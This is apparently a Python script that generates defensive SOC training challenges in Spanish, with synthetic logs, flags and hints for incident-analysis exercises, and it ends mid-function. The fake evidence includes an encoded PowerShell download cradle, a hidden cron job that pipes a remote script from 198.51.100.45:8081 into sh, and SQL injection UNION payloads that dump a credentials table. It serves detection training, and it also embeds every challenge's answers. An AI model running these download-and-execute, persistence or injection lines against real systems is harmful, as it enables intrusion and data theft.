"""Genera los 20 retos incluidos de forma determinista.

Uso:  uv run python scripts/generate_challenges.py [directorio_destino]

¡SPOILER! Este script contiene las respuestas. Si quieres jugar el
laboratorio, no lo leas.
"""

import base64
import gzip
import hashlib
import json
import random
import struct
import sys
from collections.abc import Callable, Collection, Mapping
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import quote

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from soclab import flags  # noqa: E402

DEFAULT_OUT = ROOT / "src" / "soclab" / "builtin_challenges"
BASE = datetime(2026, 10, 14, tzinfo=UTC)
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]
POINTS = {"facil": 100, "medio": 200, "dificil": 300, "experto": 500}
CONTAINERFILE = "FROM localhost/soclab-base:1\nCOPY files/ /challenge/\n"


@dataclass
class Spec:
    slug: str
    title: str
    category: str
    difficulty: str
    summary: str
    description: str
    flag: str
    flag_format: str
    hints: list[tuple[str, int]]
    files: Mapping[str, bytes | str] = field(default_factory=dict)


REGISTRY: list[Callable[[], Spec]] = []


def challenge(fn: Callable[[], Spec]) -> Callable[[], Spec]:
    REGISTRY.append(fn)
    return fn


def rng(slug: str) -> random.Random:
    return random.Random(f"soclab::{slug}")


def syslog(dt: datetime) -> str:
    return f"{MONTHS[dt.month - 1]} {dt.day:2d} {dt:%H:%M:%S}"


def iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def ext_ip(r: random.Random, avoid: Collection[str] = ()) -> str:
    while True:
        ip = f"{r.choice(['192.0.2', '198.51.100', '203.0.113'])}.{r.randint(2, 250)}"
        if ip not in avoid:
            return ip


def jsonl(rows: list[dict]) -> str:
    return "".join(json.dumps(row, ensure_ascii=False) + "\n" for row in rows)


def desc(escenario: str, objetivo: str, artefactos: list[str], formato: str) -> str:
    items = "\n".join(f"- `{a}`" for a in artefactos)
    return (
        f"## Escenario\n\n{escenario}\n\n## Objetivo\n\n{objetivo}\n\n"
        f"## Evidencias\n\nEn el entorno de análisis, dentro de `/challenge`, o con el botón "
        f"*Abrir carpeta de evidencias*:\n\n{items}\n\n## Formato de la flag\n\n`{formato}`\n"
    )


# =============================================================== FÁCIL
@challenge
def c01() -> Spec:
    slug = "01-ssh-bruteforce"
    r = rng(slug)
    attacker, noisy = "203.0.113.77", "198.51.100.23"
    events: list[tuple[datetime, str]] = []
    pid = 1200

    def add(dt: datetime, msg: str) -> None:
        nonlocal pid
        pid += r.randint(1, 7)
        events.append((dt, f"bastion01 sshd[{pid}]: {msg}"))

    users = ["mrojas", "lgarcia", "jperez", "ops", "deploy"]
    for _ in range(45):
        dt = BASE + timedelta(seconds=r.randint(7 * 3600, 19 * 3600))
        user, ip, port = r.choice(users), f"10.0.0.{r.randint(10, 60)}", r.randint(40000, 65000)
        if r.random() < 0.2:
            add(dt - timedelta(seconds=4), f"Failed password for {user} from {ip} port {port} ssh2")
        add(
            dt,
            f"Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 SHA256:k{r.randint(10**8, 10**9)}",
        )
    avoid = {attacker, noisy}
    for _ in range(25):
        ip = ext_ip(r, avoid)
        avoid.add(ip)
        start = BASE + timedelta(seconds=r.randint(0, 86000))
        for i in range(r.randint(1, 6)):
            u = r.choice(["root", "admin", "oracle", "test", "ubuntu"])
            add(
                start + timedelta(seconds=i * 3),
                f"Failed password for invalid user {u} from {ip} port {r.randint(30000, 65000)} ssh2",
            )
    start = BASE + timedelta(hours=2, minutes=10)
    for i in range(260):
        u = r.choice(["root", "admin", "pi", "user"])
        add(
            start + timedelta(seconds=i * 7),
            f"Failed password for invalid user {u} from {noisy} port {r.randint(30000, 65000)} ssh2",
        )
    start = BASE + timedelta(hours=3, minutes=5)
    for i in range(140):
        u = r.choice(["root", "admin", "backup", "postgres"])
        prefix = "" if u in {"root", "backup"} else "invalid user "
        add(
            start + timedelta(seconds=i * 6),
            f"Failed password for {prefix}{u} from {attacker} port {r.randint(30000, 65000)} ssh2",
        )
    win = start + timedelta(seconds=140 * 6 + 5)
    add(win, f"Accepted password for backup from {attacker} port 51874 ssh2")
    add(
        win + timedelta(seconds=1),
        "pam_unix(sshd:session): session opened for user backup(uid=34) by (uid=0)",
    )
    events.sort(key=lambda e: e[0])
    log = "".join(f"{syslog(dt)} {msg}\n" for dt, msg in events)
    return Spec(
        slug=slug,
        title="Fuerza bruta SSH",
        category="Análisis de logs",
        difficulty="facil",
        summary="Identifica la IP que consiguió entrar tras un ataque de fuerza bruta.",
        description=desc(
            "El bastión SSH `bastion01` recibió miles de intentos de autenticación "
            "durante la madrugada. Varias IPs de Internet probaron contraseñas, pero "
            "solo una lo consiguió.",
            "Encuentra la IP que, tras múltiples fallos, logró autenticarse con éxito.",
            ["auth.log"],
            "SOC{IP}",
        ),
        flag=f"SOC{{{attacker}}}",
        flag_format="SOC{IP}",
        hints=[
            ("Compara las líneas 'Failed password' con las 'Accepted password'.", 10),
            (
                "`grep Accepted auth.log` y cruza con `grep Failed auth.log | awk '{print $(NF-3)}' | sort | uniq -c`.",
                20,
            ),
        ],
        files={"auth.log": log},
    )


@challenge
def c02() -> Spec:
    slug = "02-phishing-headers"
    origin = "192.0.2.150"
    eml = f"""Return-Path: <bounce-7731@bancoandino-seguridad.xyz>
Delivered-To: mrojas@empresa-demo.local
Received: from mx01.empresa-demo.local (mx01.empresa-demo.local [10.0.1.25])
\tby mbox02.empresa-demo.local with LMTP id 0aF3; Wed, 14 Oct 2026 09:14:03 -0500
Received: from relay.mailout-servicios.net (relay.mailout-servicios.net [198.51.100.10])
\tby mx01.empresa-demo.local (Postfix) with ESMTPS id 4F2A91C02
\tfor <mrojas@empresa-demo.local>; Wed, 14 Oct 2026 09:14:02 -0500
Received: from [{origin}] (unknown [{origin}])
\tby relay.mailout-servicios.net (Postfix) with ESMTPSA id 9B1C3
\tfor <mrojas@empresa-demo.local>; Wed, 14 Oct 2026 14:13:58 +0000
Authentication-Results: mx01.empresa-demo.local;
\tspf=fail (sender IP is 198.51.100.10) smtp.mailfrom=bancoandino-seguridad.xyz;
\tdkim=none; dmarc=fail action=none header.from=bancoandino.com
From: "Banco Andino" <notificaciones@bancoandino.com>
Reply-To: <soporte@bancoandino-seguridad.xyz>
To: <mrojas@empresa-demo.local>
Subject: =?UTF-8?Q?[URGENTE]_Verifique_su_cuenta_en_24_horas?=
Date: Wed, 14 Oct 2026 14:13:57 +0000
Message-ID: <20261014141357.77A1@bancoandino-seguridad.xyz>
MIME-Version: 1.0
X-Mailer: PHPMailer 6.8.0
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

<html><body>
<p>Estimado cliente,</p>
<p>Detectamos actividad inusual. Verifique su identidad en las proximas 24 horas
o su cuenta sera bloqueada:</p>
<p><a href="hxxps://bancoandino-seguridad.xyz/login?id=8812">Verificar mi cuenta</a></p>
<p>Banco Andino - Seguridad</p>
</body></html>
"""
    return Spec(
        slug=slug,
        title="Cabeceras de phishing",
        category="Phishing",
        difficulty="facil",
        summary="Analiza las cabeceras Received para hallar el origen real del correo.",
        description=desc(
            "Un empleado reportó un correo que dice venir de *Banco Andino*. El remitente "
            "visible parece legítimo, pero el SOC sospecha suplantación.",
            "Siguiendo la cadena de cabeceras `Received`, identifica la IP del equipo "
            "que originó el envío (el primer salto, no los servidores intermedios).",
            ["correo_sospechoso.eml"],
            "SOC{IP}",
        ),
        flag=f"SOC{{{origin}}}",
        flag_format="SOC{IP}",
        hints=[
            ("Las cabeceras Received se leen de abajo hacia arriba.", 10),
            ("La última cabecera Received (la más baja) describe el primer salto.", 20),
        ],
        files={"correo_sospechoso.eml": eml},
    )


def _ps_enc(command: str) -> str:
    return base64.b64encode(command.encode("utf-16-le")).decode()


@challenge
def c03() -> Spec:
    slug = "03-powershell-encoded"
    r = rng(slug)
    domain = "cdn-update-check.net"
    rows = []
    benign = [
        ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs -p -s Schedule"),
        (
            "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "chrome.exe --type=renderer",
        ),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -Command Get-Service | Where Status -eq Running",
        ),
        (
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
            "OUTLOOK.EXE /recycle",
        ),
        ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe"),
        (
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -NoProfile -EncodedCommand "
            + _ps_enc("Get-Date | Out-File C:\\temp\\fecha.txt"),
        ),
    ]
    for i in range(90):
        image, cmd = r.choice(benign)
        rows.append(
            {
                "TimeCreated": iso(BASE + timedelta(hours=8, seconds=i * 211)),
                "EventID": 4688,
                "Computer": f"WS-{r.randint(1, 30):03d}",
                "SubjectUserName": r.choice(["mrojas", "lgarcia", "jperez"]),
                "NewProcessName": image,
                "CommandLine": cmd,
            }
        )
    evil = "IEX (New-Object Net.WebClient).DownloadString('http://" + domain + "/a.ps1')"
    rows.insert(
        57,
        {
            "TimeCreated": iso(BASE + timedelta(hours=11, minutes=17, seconds=3)),
            "EventID": 4688,
            "Computer": "WS-014",
            "SubjectUserName": "lgarcia",
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -enc " + _ps_enc(evil),
        },
    )
    rows.sort(key=lambda x: x["TimeCreated"])
    return Spec(
        slug=slug,
        title="PowerShell codificado",
        category="Endpoint",
        difficulty="facil",
        summary="Decodifica un comando PowerShell ofuscado para encontrar el dominio de descarga.",
        description=desc(
            "El EDR exportó eventos de creación de procesos (4688) de varias estaciones. "
            "Una de ellas ejecutó PowerShell oculto con un comando codificado.",
            "Decodifica el comando malicioso y encuentra el dominio desde el que se "
            "descarga la siguiente etapa.",
            ["process_events.jsonl"],
            "SOC{dominio}",
        ),
        flag=f"SOC{{{domain}}}",
        flag_format="SOC{dominio}",
        hints=[
            ("Busca los parámetros -enc / -EncodedCommand.", 10),
            ("PowerShell usa Base64 sobre UTF-16LE: `base64 -d | iconv -f utf-16le` o Python.", 20),
        ],
        files={"process_events.jsonl": jsonl(rows)},
    )


@challenge
def c04() -> Spec:
    slug = "04-ioc-hash-match"
    r = rng(slug)

    def h() -> str:
        return hashlib.sha256(r.randbytes(32)).hexdigest()

    names = [
        "chrome.exe",
        "Teams.exe",
        "OneDrive.exe",
        "notepad.exe",
        "AcroRd32.exe",
        "zoom.exe",
        "slack.exe",
        "putty.exe",
        "7z.exe",
        "python.exe",
        "vlc.exe",
        "git.exe",
    ]
    inventory = ["ruta,sha256,tamano_bytes,firmado"]
    for i in range(80):
        name = r.choice(names)
        inventory.append(
            f"C:\\Program Files\\App{i:02d}\\{name},{h()},{r.randint(10_000, 90_000_000)},si"
        )
    evil_hash = h()
    inventory.insert(
        43, f"C:\\Users\\lgarcia\\AppData\\Roaming\\Updater\\winupd.exe,{evil_hash},284672,no"
    )
    feed = ["indicador,tipo,amenaza,confianza,fecha"]
    for _ in range(15):
        feed.append(
            f"{h().upper()},sha256,{r.choice(['Emotet', 'QakBot', 'AgentTesla', 'Remcos'])},alta,2026-10-0{r.randint(1, 9)}"
        )
        feed.append(
            f"{ext_ip(r)},ipv4,{r.choice(['C2', 'Scanner'])},media,2026-10-1{r.randint(0, 3)}"
        )
        feed.append(
            f"{r.choice(['login', 'cdn', 'files'])}-{r.randint(100, 999)}.{r.choice(['top', 'xyz', 'click'])},dominio,Phishing,media,2026-10-11"
        )
    feed.insert(20, f"{evil_hash.upper()},sha256,AsyncRAT,alta,2026-10-12")
    return Spec(
        slug=slug,
        title="Coincidencia de IOC",
        category="Threat Intelligence",
        difficulty="facil",
        summary="Cruza el inventario de binarios con un feed de inteligencia de amenazas.",
        description=desc(
            "Recibimos un feed de IOCs de un CERT aliado. El inventario de binarios de "
            "una estación sospechosa fue exportado por el EDR.",
            "Encuentra el binario del inventario cuyo hash aparece en el feed.",
            ["inventario_binarios.csv", "feed_iocs.csv"],
            "SOC{nombre_del_archivo.exe}",
        ),
        flag="SOC{winupd.exe}",
        flag_format="SOC{nombre_del_archivo.exe}",
        hints=[
            ("Extrae solo los indicadores de tipo sha256 del feed.", 10),
            ("Ojo: el feed usa hexadecimal en MAYÚSCULAS; normaliza antes de comparar.", 20),
        ],
        files={
            "inventario_binarios.csv": "\n".join(inventory) + "\n",
            "feed_iocs.csv": "\n".join(feed) + "\n",
        },
    )


def _combined(
    ip: str, dt: datetime, method: str, path: str, status: int, size: int, ua: str
) -> str:
    return f'{ip} - - [{dt:%d/%b/%Y:%H:%M:%S} +0000] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"\n'


BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/141.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0",
]


@challenge
def c05() -> Spec:
    slug = "05-hidden-admin-panel"
    r = rng(slug)
    attacker, ua = "198.51.100.66", "gobuster/3.6"
    public = [
        "/",
        "/index.html",
        "/css/main.css",
        "/js/app.js",
        "/img/logo.png",
        "/contacto.html",
        "/productos.html",
    ]
    lines: list[tuple[datetime, str]] = []
    for _ in range(300):
        dt = BASE + timedelta(seconds=r.randint(8 * 3600, 18 * 3600))
        lines.append(
            (
                dt,
                _combined(
                    ext_ip(r, {attacker}),
                    dt,
                    "GET",
                    r.choice(public),
                    200,
                    r.randint(500, 40000),
                    r.choice(BROWSERS),
                ),
            )
        )
    words = [
        "admin",
        "backup",
        "old",
        "test",
        "dev",
        "api",
        "wp-admin",
        "phpmyadmin",
        "config",
        "uploads",
        "private",
        "panel",
        "login",
        "db",
        "cgi-bin",
        "temp",
        "logs",
        "staging",
        "secret",
        "portal",
    ]
    start = BASE + timedelta(hours=14, minutes=2)
    i = 0
    for w in words:
        for ext in ["", "/", ".php", ".bak", ".zip", "/login.php", "-2023", "-2024/login.php"]:
            path = f"/{w}{ext}"
            if path == "/panel-admin-2024/login.php":
                continue
            status = 403 if w in {"config", "private"} and ext == "/" else 404
            lines.append(
                (
                    start + timedelta(milliseconds=150 * i),
                    _combined(
                        attacker,
                        start + timedelta(milliseconds=150 * i),
                        "GET",
                        path,
                        status,
                        196 if status == 404 else 277,
                        ua,
                    ),
                )
            )
            i += 1
    hit = start + timedelta(milliseconds=150 * i + 900)
    lines.append(
        (hit, _combined(attacker, hit, "GET", "/panel-admin-2024/login.php", 200, 3311, ua))
    )
    for k in range(6):
        t = hit + timedelta(seconds=40 + k * 3)
        lines.append(
            (
                t,
                _combined(
                    attacker,
                    t,
                    "POST",
                    "/panel-admin-2024/login.php",
                    200 if k < 5 else 302,
                    3388,
                    "Mozilla/5.0 (X11; Linux x86_64) python-requests/2.32",
                ),
            )
        )
    lines.sort(key=lambda x: x[0])
    return Spec(
        slug=slug,
        title="Panel de administración oculto",
        category="Web",
        difficulty="facil",
        summary="Detecta qué ruta oculta encontró un escáner de directorios.",
        description=desc(
            "El servidor web corporativo registró un pico de errores 404 por la tarde. "
            "Parece un escaneo automático de directorios que terminó encontrando algo.",
            "Identifica la ruta exacta que el escáner descubrió (respondió 200) y que "
            "luego fue atacada con peticiones POST.",
            ["access.log"],
            "SOC{/ruta/completa}",
        ),
        flag="SOC{/panel-admin-2024/login.php}",
        flag_format="SOC{/ruta/completa}",
        hints=[
            ("Filtra por el User-Agent de la herramienta de escaneo.", 10),
            ("`awk '$9==200' access.log | grep gobuster`", 20),
        ],
        files={"access.log": "".join(line for _, line in lines)},
    )


@challenge
def c06() -> Spec:
    slug = "06-dns-blocklist"
    r = rng(slug)
    victim, evil = "10.0.5.23", "update.malwr-cdn.top"
    good = [
        "www.google.com",
        "outlook.office365.com",
        "teams.microsoft.com",
        "github.com",
        "intranet.empresa-demo.local",
        "api.slack.com",
        "cdn.jsdelivr.net",
        "time.windows.com",
        "cdn-malwr.top",
        "update.microsoft.com",
    ]
    rows = []
    for _ in range(450):
        dt = BASE + timedelta(seconds=r.randint(8 * 3600, 17 * 3600))
        client = f"10.0.5.{r.randint(10, 80)}"
        rows.append(
            (
                dt,
                f"{iso(dt)} client={client} query={r.choice(good)} type={r.choice(['A', 'AAAA'])} rcode=NOERROR",
            )
        )
    for k in range(3):
        dt = BASE + timedelta(hours=10, minutes=31 + k * 15)
        rows.append((dt, f"{iso(dt)} client={victim} query={evil} type=A rcode=NOERROR"))
    rows.sort(key=lambda x: x[0])
    blocklist = [
        "# Blocklist interna - dominios maliciosos confirmados",
        "# Formato: un dominio por línea (incluye subdominios)",
    ]
    for _ in range(25):
        blocklist.append(
            f"{r.choice(['secure', 'login', 'cdn', 'files', 'track'])}-{r.randint(10, 999)}.{r.choice(['xyz', 'top', 'click', 'info'])}"
        )
    blocklist.insert(14, "malwr-cdn.top")
    return Spec(
        slug=slug,
        title="Consulta a dominio en lista negra",
        category="Red",
        difficulty="facil",
        summary="Cruza los logs DNS con la blocklist para encontrar el equipo comprometido.",
        description=desc(
            "Threat Intel actualizó la blocklist de dominios. Necesitamos saber si algún "
            "equipo interno resolvió alguno de ellos durante el día.",
            "Encuentra la IP interna que consultó un dominio presente en la blocklist "
            "(recuerda que la lista bloquea también los subdominios).",
            ["dns.log", "blocklist.txt"],
            "SOC{IP}",
        ),
        flag=f"SOC{{{victim}}}",
        flag_format="SOC{IP}",
        hints=[
            ("Un subdominio de un dominio bloqueado también es malicioso.", 10),
            ("Cuidado con dominios parecidos que NO están en la lista.", 15),
        ],
        files={
            "dns.log": "".join(f"{x}\n" for _, x in rows),
            "blocklist.txt": "\n".join(blocklist) + "\n",
        },
    )


# =============================================================== MEDIO
@challenge
def c07() -> Spec:
    slug = "07-dns-tunneling"
    r = rng(slug)
    flag = "SOC{tunel_dns_exfiltrado}"
    secret = f"usuario=rrhh_admin;archivo=nominas.xlsx;{flag}".encode().hex()
    chunks = [secret[i : i + 30] for i in range(0, len(secret), 30)]
    order = list(range(len(chunks)))
    r.shuffle(order)
    order.insert(4, order[2])  # retransmisión duplicada
    rows = []
    for _ in range(400):
        dt = BASE + timedelta(seconds=r.randint(9 * 3600, 12 * 3600))
        rows.append(
            (
                dt,
                f"{iso(dt)} client=10.0.8.{r.randint(10, 90)} query={r.choice(['www.bing.com', 'login.microsoftonline.com', 'ocsp.digicert.com', 'intranet.empresa-demo.local'])} type=A rcode=NOERROR",
            )
        )
    start = BASE + timedelta(hours=10, minutes=5)
    for k, idx in enumerate(order):
        dt = start + timedelta(seconds=k * 4 + r.randint(0, 2))
        rows.append(
            (
                dt,
                f"{iso(dt)} client=10.0.8.15 query={chunks[idx]}.{idx}.t.exfil-cdn.org type=TXT rcode=NXDOMAIN",
            )
        )
    rows.sort(key=lambda x: x[0])
    return Spec(
        slug=slug,
        title="Túnel DNS",
        category="Red",
        difficulty="medio",
        summary="Reconstruye datos exfiltrados en subdominios DNS.",
        description=desc(
            "El resolver interno muestra consultas TXT con subdominios largos y aleatorios "
            "hacia un dominio externo. Sospechamos exfiltración por túnel DNS.",
            "Reconstruye la información exfiltrada. La flag está dentro de los datos.",
            ["dns.log"],
            "SOC{...}",
        ),
        flag=flag,
        flag_format="SOC{...}",
        hints=[
            ("Cada consulta lleva <datos_hex>.<n_secuencia>.t.exfil-cdn.org", 20),
            (
                "Ordena por secuencia, elimina duplicados y decodifica de hexadecimal (`xxd -r -p`).",
                40,
            ),
        ],
        files={"dns.log": "".join(f"{x}\n" for _, x in rows)},
    )


@challenge
def c08() -> Spec:
    slug = "08-c2-beaconing"
    r = rng(slug)
    c2, port = "203.0.113.200", 8443
    ext = [ext_ip(r, {c2}) for _ in range(50)]
    rows = []
    for _ in range(1500):
        dt = BASE + timedelta(seconds=r.randint(8 * 3600, 11 * 3600))
        rows.append(
            (
                dt,
                f"10.0.2.{r.randint(10, 60)}",
                r.choice(ext),
                r.choice([80, 443, 443, 443, 8080]),
                r.randint(300, 90000),
                r.randint(500, 900000),
            )
        )
    t = BASE + timedelta(hours=8)
    for _ in range(180):
        t += timedelta(seconds=60 + r.randint(-2, 2))
        rows.append((t, "10.0.2.31", c2, port, r.randint(310, 330), r.randint(120, 140)))
    t = BASE + timedelta(hours=8)
    for _ in range(120):
        t += timedelta(seconds=r.randint(5, 180))
        rows.append(
            (t, "10.0.2.40", "192.0.2.10", 443, r.randint(400, 5000), r.randint(1000, 300000))
        )
    rows.sort(key=lambda x: x[0])
    csv = "ts,src_ip,dst_ip,dst_port,proto,bytes_out,bytes_in\n" + "".join(
        f"{iso(dt)},{s},{d},{p},tcp,{bo},{bi}\n" for dt, s, d, p, bo, bi in rows
    )
    return Spec(
        slug=slug,
        title="Beaconing de C2",
        category="Red",
        difficulty="medio",
        summary="Detecta conexiones periódicas hacia un servidor de comando y control.",
        description=desc(
            "El firewall perimetral exportó tres horas de conexiones salientes. Un "
            "implante suele 'llamar a casa' a intervalos regulares con poco tráfico.",
            "Encuentra el destino (IP:puerto) del beaconing.",
            ["conexiones.csv"],
            "SOC{IP:puerto}",
        ),
        flag=f"SOC{{{c2}:{port}}}",
        flag_format="SOC{IP:puerto}",
        hints=[
            ("Agrupa por (origen, destino, puerto) y mira cuántas conexiones hay.", 20),
            (
                "Calcula el intervalo entre conexiones consecutivas: el beacon tiene muy poca variación.",
                40,
            ),
        ],
        files={"conexiones.csv": csv},
    )


@challenge
def c09() -> Spec:
    slug = "09-sql-injection"
    r = rng(slug)
    attacker, ua = "203.0.113.45", "sqlmap/1.8.4#stable (https://sqlmap.org)"
    lines: list[tuple[datetime, str]] = []
    for _ in range(250):
        dt = BASE + timedelta(seconds=r.randint(9 * 3600, 17 * 3600))
        path = r.choice(
            ["/", "/productos.php?id=" + str(r.randint(1, 40)), "/carrito.php", "/css/tienda.css"]
        )
        lines.append(
            (
                dt,
                _combined(
                    ext_ip(r, {attacker}),
                    dt,
                    "GET",
                    path,
                    200,
                    r.randint(900, 30000),
                    r.choice(BROWSERS),
                ),
            )
        )
    payloads = [
        ("1'", 500), ("1 AND 1=1", 200), ("1 AND 1=2", 200), ("1 ORDER BY 3-- -", 200),
        ("1 ORDER BY 4-- -", 500), ("-1 UNION SELECT 1,2,3-- -", 200),
        ("-1 UNION SELECT 1,2,3 FROM usuarios-- -", 500),
        ("-1 UNION SELECT table_name,2,3 FROM information_schema.tables-- -", 200),
        ("-1 UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='clientes_vip'-- -", 200),
        ("-1 UNION SELECT usuario,clave,email FROM clientes_vip-- -", 200),
    ]  # fmt: skip
    t = BASE + timedelta(hours=15, minutes=40)
    for payload, status in payloads:
        t += timedelta(seconds=r.randint(2, 9))
        size = 48211 if "FROM clientes_vip" in payload else r.randint(1500, 9000)
        lines.append(
            (
                t,
                _combined(
                    attacker,
                    t,
                    "GET",
                    "/productos.php?id=" + quote(payload, safe=""),
                    status,
                    size,
                    ua,
                ),
            )
        )
    lines.sort(key=lambda x: x[0])
    return Spec(
        slug=slug,
        title="Inyección SQL",
        category="Web",
        difficulty="medio",
        summary="Reconstruye un ataque SQLi y determina qué tabla fue volcada.",
        description=desc(
            "La tienda online reportó lentitud y respuestas inusualmente grandes en "
            "`/productos.php`. Los parámetros de las peticiones llegan URL-encoded.",
            "Determina el nombre de la tabla de negocio cuyos datos se llevó el atacante.",
            ["access.log"],
            "SOC{nombre_tabla}",
        ),
        flag="SOC{clientes_vip}",
        flag_format="SOC{nombre_tabla}",
        hints=[
            (
                "Decodifica las URLs: `python3 -c 'import sys,urllib.parse;print(urllib.parse.unquote(sys.stdin.read()))'`.",
                20,
            ),
            ("Busca UNION SELECT ... FROM <tabla> con respuesta 200 y tamaño grande.", 40),
        ],
        files={"access.log": "".join(x for _, x in lines)},
    )


@challenge
def c10() -> Spec:
    slug = "10-rogue-account"
    r = rng(slug)
    ev = []

    def add(dt: datetime, eid: int, **data: object) -> None:
        ev.append({"TimeCreated": iso(dt), "EventID": eid, "Computer": "SRV-APP01", **data})

    users = ["mrojas", "lgarcia", "jperez", "admin.ti", "svc_sql"]
    for _ in range(120):
        dt = BASE + timedelta(seconds=r.randint(7 * 3600, 18 * 3600))
        add(
            dt,
            4624,
            TargetUserName=r.choice(users),
            LogonType=r.choice([2, 3, 3, 3]),
            IpAddress=f"10.0.0.{r.randint(10, 90)}",
            TargetLogonId=hex(r.randint(0x100000, 0xFFFFFF)),
        )
    add(
        BASE + timedelta(hours=9, minutes=3),
        4624,
        TargetUserName="admin.ti",
        LogonType=3,
        IpAddress="10.0.0.15",
        TargetLogonId="0x2a11f0",
    )
    add(
        BASE + timedelta(hours=9, minutes=5),
        4720,
        SubjectUserName="admin.ti",
        SubjectLogonId="0x2a11f0",
        TargetUserName="jperez2",
    )
    t = BASE + timedelta(hours=22, minutes=14)
    for i in range(30):
        add(
            t + timedelta(seconds=i * 5),
            4625,
            TargetUserName="soporte",
            LogonType=10,
            IpAddress="198.51.100.99",
            Status="0xc000006d",
        )
    t += timedelta(seconds=160)
    add(
        t,
        4624,
        TargetUserName="soporte",
        LogonType=10,
        IpAddress="198.51.100.99",
        TargetLogonId="0x3e7a21",
    )
    add(
        t + timedelta(seconds=1),
        4672,
        SubjectUserName="soporte",
        SubjectLogonId="0x3e7a21",
        PrivilegeList="SeDebugPrivilege SeBackupPrivilege",
    )
    add(
        t + timedelta(minutes=3),
        4720,
        SubjectUserName="soporte",
        SubjectLogonId="0x3e7a21",
        TargetUserName="svc_backup2",
    )
    add(
        t + timedelta(minutes=3, seconds=20),
        4732,
        SubjectUserName="soporte",
        SubjectLogonId="0x3e7a21",
        MemberName="svc_backup2",
        TargetUserName="Administradores",
    )
    ev.sort(key=lambda e: e["TimeCreated"])
    return Spec(
        slug=slug,
        title="Cuenta creada por el intruso",
        category="Windows",
        difficulty="medio",
        summary="Correlaciona eventos de seguridad por LogonId para hallar la cuenta del atacante.",
        description=desc(
            "Durante la noche hubo un acceso RDP desde Internet a `SRV-APP01`. El equipo de "
            "TI también creó cuentas ese día, así que no basta con buscar el evento 4720.",
            "Identifica la cuenta creada en la sesión del atacante.",
            ["security_events.jsonl"],
            "SOC{nombre_cuenta}",
        ),
        flag="SOC{svc_backup2}",
        flag_format="SOC{nombre_cuenta}",
        hints=[
            ("RDP = LogonType 10. Busca el inicio de sesión exitoso desde una IP pública.", 20),
            ("Relaciona TargetLogonId (4624) con SubjectLogonId (4720).", 40),
        ],
        files={"security_events.jsonl": jsonl(ev)},
    )


@challenge
def c11() -> Spec:
    slug = "11-cron-persistence"
    payload = base64.b64encode(
        b"curl -fsS http://198.51.100.45:8081/k.sh | sh >/dev/null 2>&1"
    ).decode()
    files = {
        "rootfs/etc/crontab": "SHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n0 3\t* * *\troot\t/usr/local/bin/backup.sh\n",
        "rootfs/etc/cron.d/logrotate": "# rotación diaria\n25 6 * * * root test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf\n",
        "rootfs/etc/cron.d/.sysupdate": f'*/5 * * * * root /bin/sh -c "echo {payload} | base64 -d | sh"\n',
        "rootfs/usr/local/bin/backup.sh": "#!/bin/sh\nrsync -a /var/www/ backup@10.0.0.50:/srv/backups/web01/\n",
        "rootfs/var/spool/cron/crontabs/www-data": "*/10 * * * * php /var/www/html/artisan schedule:run >/dev/null 2>&1\n",
        "rootfs/home/deploy/.bashrc": "export PATH=$HOME/bin:$PATH\nalias ll='ls -la'\n",
        "rootfs/etc/hostname": "web01\n",
        "LEEME.txt": "Copia del sistema de archivos de web01 tomada por el equipo de respuesta.\nRuta: rootfs/\n",
    }
    return Spec(
        slug=slug,
        title="Persistencia en cron",
        category="Linux Forense",
        difficulty="medio",
        summary="Encuentra el mecanismo de persistencia oculto en un sistema Linux.",
        description=desc(
            "El servidor `web01` vuelve a infectarse aunque se limpie el malware. "
            "Se tomó una copia del sistema de archivos para analizarla.",
            "Encuentra la tarea programada maliciosa y determina el servidor "
            "(IP:puerto) desde el que descarga su payload.",
            ["rootfs/ (copia del sistema de archivos)", "LEEME.txt"],
            "SOC{IP:puerto}",
        ),
        flag="SOC{198.51.100.45:8081}",
        flag_format="SOC{IP:puerto}",
        hints=[
            (
                "Los archivos que empiezan por punto no salen con `ls` normal: usa `ls -la` o `find`.",
                20,
            ),
            ("El comando está en Base64: `echo ... | base64 -d`.", 40),
        ],
        files=files,
    )


@challenge
def c12() -> Spec:
    slug = "12-macro-process-tree"
    r = rng(slug)
    rows = []

    def proc(dt: datetime, pid: int, image: str, cmd: str, ppid: int, pimage: str) -> None:
        rows.append(
            {
                "UtcTime": iso(dt),
                "EventID": 1,
                "Computer": "WS-007",
                "User": "EMPRESA\\mrojas",
                "ProcessId": pid,
                "Image": image,
                "CommandLine": cmd,
                "ParentProcessId": ppid,
                "ParentImage": pimage,
            }
        )

    exp = "C:\\Windows\\explorer.exe"
    word = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
    ps = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    used = {3120, 4410, 5544, 6120, 6188, 7001}
    for _ in range(70):
        pid = r.randint(1000, 9999)
        while pid in used:
